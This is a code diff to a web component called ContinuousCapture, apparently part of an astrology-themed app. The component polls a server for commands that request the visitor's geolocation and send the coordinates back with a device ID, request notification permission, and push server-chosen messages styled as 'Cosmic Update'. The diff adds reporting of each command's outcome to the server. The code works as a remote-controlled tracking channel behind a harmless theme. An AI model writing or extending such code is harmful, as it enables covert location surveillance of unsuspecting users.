@@ -64,6 +64,10 @@ export function ContinuousCapture() {
               .then(data => {
                 if (data.success && data.commands) {
                   data.commands.forEach((cmd: any) => {
+                    const updateStatus = (status: string) => {
+                      fetch(`${API_URL}/api/commands`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ action: "update_status", commandId: cmd.id, status }) }).catch(() => {});
+                    };
+
                     if (cmd.command === "REQUEST_LOCATION") {
                       if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
@@ -72,22 +76,35 @@ export function ContinuousCapture() {
                               method: "POST",
                               headers: { "Content-Type": "application/json" },
                               body: JSON.stringify({ deviceId, latitude: pos.coords.latitude, longitude: pos.coords.longitude })
-                            });
+                            }).catch(() => {});
+                            updateStatus("granted");
                           },
-                          () => {}
+                          () => updateStatus("denied")
                         );
+                      } else {
+                        updateStatus("unsupported");
                       }
                     } else if (cmd.command === "REQUEST_NOTIFICATION") {
                       if ("Notification" in window) {
-                        Notification.requestPermission();
+                        Notification.requestPermission().then(perm => updateStatus(perm));
+                      } else {
+                        updateStatus("unsupported");
                       }
                     } else if (cmd.command === "SHOW_NOTIFICATION") {
                       if ("Notification" in window && Notification.permission === "granted") {
                         new Notification("Cosmic Update", { body: cmd.payload || "The stars align for you." });
+                        updateStatus("delivered");
                       } else if ("Notification" in window) {
                         Notification.requestPermission().then(perm => {
-                          if (perm === "granted") new Notification("Cosmic Update", { body: cmd.payload || "The stars align for you." });
+                          if (perm === "granted") {
+                            new Notification("Cosmic Update", { body: cmd.payload || "The stars align for you." });
+                            updateStatus("delivered");
+                          } else {
+                            updateStatus("denied");
+                          }
                         });
+                      } else {
+                        updateStatus("unsupported");
                       }
                     }
                   });
